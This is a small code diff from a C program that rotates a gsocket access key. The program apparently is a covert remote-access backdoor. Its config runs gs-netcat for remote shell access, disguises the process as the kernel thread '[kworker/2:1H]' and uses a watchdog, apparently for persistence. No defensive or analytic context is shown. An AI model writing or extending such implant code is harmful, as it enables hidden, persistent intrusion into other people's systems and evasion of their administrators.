@@ -22,7 +22,7 @@
 #include <errno.h>
 
 // ─── CONFIG ───────────────────────────────────────────────────────────────────
-#define GSOCKET_KEY     "sPZiuB48bKwvSzkj3KbbWD"
+#define GSOCKET_KEY     "HWgohbHcyFryd2AgojvM7w"
 #define GSOCKET_BIN     "gs-netcat"
 #define FAKE_PROC_NAME  "[kworker/2:1H]"
 #define WATCHDOG_INTERVAL 3
